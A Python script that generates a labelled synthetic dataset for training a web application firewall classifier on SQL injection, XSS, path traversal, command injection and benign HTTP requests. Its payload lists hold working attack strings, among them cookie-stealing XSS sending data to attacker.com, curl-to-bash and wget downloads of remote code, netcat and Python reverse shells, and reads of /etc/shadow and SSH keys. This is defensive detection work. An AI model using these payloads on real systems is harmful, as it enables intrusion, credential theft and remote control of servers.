"""
generate_dataset.py
-------------------
Generates a large, diverse synthetic WAF training dataset with 2500+ samples.
Classes: sqli, xss, traversal, cmdi, benign
"""

import csv
import random
import os

random.seed(42)

# ─── SQL INJECTION ────────────────────────────────────────────────────────────
sqli_templates = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' OR 'x'='x",
    "1' OR '1'='1'--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1 OR 1=1",
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "1 UNION SELECT version()--",
    "1 UNION SELECT user()--",
    "1 UNION SELECT @@datadir--",
    "1; DROP TABLE users--",
    "1; DROP TABLE orders--",
    "1; DELETE FROM users--",
    "'; DROP TABLE users; --",
    "' AND SLEEP(5)--",
    "1 AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=BENCHMARK(5000000,MD5('a'))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1 AND updatexml(1,concat(0x7e,user()),1)--",
    "' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC master..xp_cmdshell('dir')--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "';SELECT pg_sleep(5)--",
    "1;SELECT pg_sleep(5)--",
    "0x27 OR 0x31=0x31--",
    "%27 OR %271%27=%271",
    "' AND 1=0 UNION SELECT '1','2','3'--",
    "admin' OR '1'='1' LIMIT 1--",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1' GROUP BY 1--",
    "' HAVING 1=1--",
    "1' AND 1=2--",
    "' AND 2>1--",
    "OR 1=1--",
    "OR 1=1#",
    "1 OR 1=1--",
    "'; INSERT INTO users (username,password) VALUES ('hacked','hacked')--",
    "' OR IF(1=1,SLEEP(3),0)--",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

sqli_paths = ["/login", "/search", "/user", "/product", "/api/auth", "/admin/login", "/checkout"]
sqli_methods = ["POST", "GET"]

def make_sqli():
    payload = random.choice(sqli_templates)
    method = random.choice(sqli_methods)
    path = random.choice(sqli_paths)
    if method == "GET":
        return f"GET {path}?q={payload} HTTP/1.1\nHost: example.com"
    else:
        return f"POST {path} HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername={payload}&password=test"

# ─── XSS ──────────────────────────────────────────────────────────────────────
xss_templates = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=prompt(1)>",
    "<img src=x onerror=confirm(1)>",
    "<img src='x' onerror='alert(document.cookie)'>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=prompt(document.domain)>",
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<iframe onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onchange=alert(1)><option>1</option></select>",
    "<a href=javascript:alert(1)>click me</a>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
    "<div style='background:url(javascript:alert(1))'>",
    "<style>body{background:url('javascript:alert(1)')}</style>",
    "expression(alert(1))",
    "-moz-binding: url(http://attacker.com/xss.xml#xss)",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<xss style=xss:expression(alert(1))>",
    "'; alert(1); var x='",
    "<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>",
]

xss_paths = ["/search", "/comment", "/profile", "/feedback", "/posts"]

def make_xss():
    payload = random.choice(xss_templates)
    path = random.choice(xss_paths)
    method = random.choice(["GET", "POST"])
    if method == "GET":
        return f"GET {path}?q={payload} HTTP/1.1\nHost: example.com"
    else:
        return f"POST {path} HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\ncomment={payload}&user=test"

# ─── PATH TRAVERSAL ──────────────────────────────────────────────────────────
traversal_templates = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../etc/shadow",
    "../../../../etc/shadow",
    "../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../var/log/apache2/access.log",
    "../../../../var/www/html/.htpasswd",
    "..%2Fetc%2Fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "....//etc/passwd",
    "....//..//etc/passwd",
    "..%252f..%252fetc%252fpasswd",
    "..\\..\\windows\\system32",
    "..\\..\\windows\\system.ini",
    "..\\..\\..\\windows\\win.ini",
    "%5c..%5c..%5cwindows%5csystem32",
    "..%c0%afetc%c0%afpasswd",
    "..%c1%9cetc%c1%9cpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/cmdline",
    "/var/log/auth.log",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "expect://id",
    "/../../boot.ini",
    "..%u2215etc%u2215passwd",
]

traversal_paths = ["/files", "/download", "/view", "/static", "/images", "/api/file"]

def make_traversal():
    payload = random.choice(traversal_templates)
    path = random.choice(traversal_paths)
    return f"GET {path}?file={payload} HTTP/1.1\nHost: example.com"

# ─── COMMAND INJECTION ───────────────────────────────────────────────────────
cmdi_templates = [
    "; cat /etc/passwd",
    "| cat /etc/shadow",
    "&& whoami",
    "& whoami",
    "|| whoami",
    "| whoami",
    "; whoami",
    "`whoami`",
    "$(whoami)",
    "; id",
    "| id",
    "&& id",
    "`id`",
    "$(id)",
    "; ls -la",
    "| ls -la /",
    "&& ls /etc",
    "; uname -a",
    "| uname -a",
    "&& uname -a",
    "; curl http://attacker.com/shell.sh | bash",
    "| wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m",
    "$(curl attacker.com/c2?h=$(hostname))",
    "; nc -e /bin/sh attacker.com 4444",
    "| nc attacker.com 4444 -e /bin/bash",
    "&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "; ping -c 5 attacker.com",
    "| ping attacker.com",
    "&& nmap -sV localhost",
    "`cat /etc/hosts`",
    "$(cat /etc/group)",
    "; find / -name id_rsa 2>/dev/null",
    "| find / -perm -4000 2>/dev/null",
    "&& env",
    "; printenv",
    "| set",
    "| dir C:\\",
    "& dir",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
]

cmdi_paths = ["/ping", "/exec", "/run", "/debug", "/tools", "/api/execute"]

def make_cmdi():
    cmd = random.choice(cmdi_templates)
    path = random.choice(cmdi_paths)
    method = random.choice(["GET", "POST"])
    clean_input = random.choice(["localhost", "8.8.8.8", "test", "check", "192.168.1.1"])
    if method == "GET":
        return f"GET {path}?host={clean_input}{cmd} HTTP/1.1\nHost: example.com"
    else:
        return f"POST {path} HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\ncmd={clean_input}{cmd}"

# ─── BENIGN ──────────────────────────────────────────────────────────────────
usernames        = ["john_doe", "alice", "bob", "charlie", "diana", "eve", "frank", "grace", "heidi", "ivan", "judy"]
search_queries   = ["laptop", "blue shirt", "python book", "headphones", "coffee maker", "running shoes", "camera lens", "gaming chair", "smartphone", "desk lamp", "wireless mouse"]
products         = ["product_123", "item_456", "sku_789", "cat_electronics", "cat_clothing", "cat_books", "brand_apple", "brand_sony", "newest_arrivals", "sale_items"]
file_requests    = ["report.pdf", "invoice_2024.pdf", "image.png", "data.csv", "readme.txt", "manual.pdf", "photo.jpg", "document.docx", "style.css", "app.js"]
benign_endpoints = ["/api/products", "/api/users/profile", "/home", "/about", "/contact", "/cart", "/orders", "/wishlist", "/settings", "/help"]
api_keys         = ["key_xyz123", "token_abc456", "bearer_987def"]

def make_benign():
    choice = random.randint(0, 7)
    if choice == 0:
        user = random.choice(usernames)
        return f"POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername={user}&password=SecureP@ss1"
    elif choice == 1:
        q = random.choice(search_queries)
        return f"GET /search?q={q}&page={random.randint(1,10)}&sort=asc HTTP/1.1\nHost: example.com"
    elif choice == 2:
        ep = random.choice(benign_endpoints)
        return f"GET {ep} HTTP/1.1\nHost: example.com\nAuthorization: Bearer {random.choice(api_keys)}"
    elif choice == 3:
        f = random.choice(file_requests)
        return f"GET /files/{f} HTTP/1.1\nHost: example.com"
    elif choice == 4:
        p = random.choice(products)
        return f"GET /product/{p} HTTP/1.1\nHost: example.com\nAccept: application/json"
    elif choice == 5:
        user = random.choice(usernames)
        return f"PUT /api/users/{user} HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{{\"email\":\"{user}@email.com\",\"name\":\"{user.replace('_',' ').title()}\"}}"
    elif choice == 6:
        # API call with normal params
        return f"GET /api/data?limit={random.randint(5,100)}&offset={random.randint(0,500)}&format=json HTTP/1.1\nHost: example.com"
    else:
        return f"DELETE /api/cart/item/{random.randint(1,999)} HTTP/1.1\nHost: example.com\nAuthorization: Bearer token123"

# ─── GENERATE AND SAVE ───────────────────────────────────────────────────────
def generate_dataset(n_per_class: int = 500, output_path: str = "data/processed/augmented_dataset.csv"):
    rows = []

    print(f"Generating {n_per_class} samples per class...")

    for _ in range(n_per_class):
        rows.append({"request_text": make_sqli(),     "label": "sqli"})
    print(f"  ✓ {n_per_class} SQLi samples")

    for _ in range(n_per_class):
        rows.append({"request_text": make_xss(),      "label": "xss"})
    print(f"  ✓ {n_per_class} XSS samples")

    for _ in range(n_per_class):
        rows.append({"request_text": make_traversal(), "label": "traversal"})
    print(f"  ✓ {n_per_class} Path Traversal samples")

    for _ in range(n_per_class):
        rows.append({"request_text": make_cmdi(),     "label": "cmdi"})
    print(f"  ✓ {n_per_class} Command Injection samples")

    for _ in range(n_per_class):
        rows.append({"request_text": make_benign(),   "label": "benign"})
    print(f"  ✓ {n_per_class} Benign samples")

    random.shuffle(rows)

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["request_text", "label"])
        writer.writeheader()
        writer.writerows(rows)

    total = len(rows)
    print(f"\n✅ Dataset saved to: {output_path}")
    print(f"   Total samples: {total}")
    print(f"   Per class: {n_per_class} × 5 = {total}")
    return output_path


if __name__ == "__main__":
    generate_dataset(n_per_class=500)
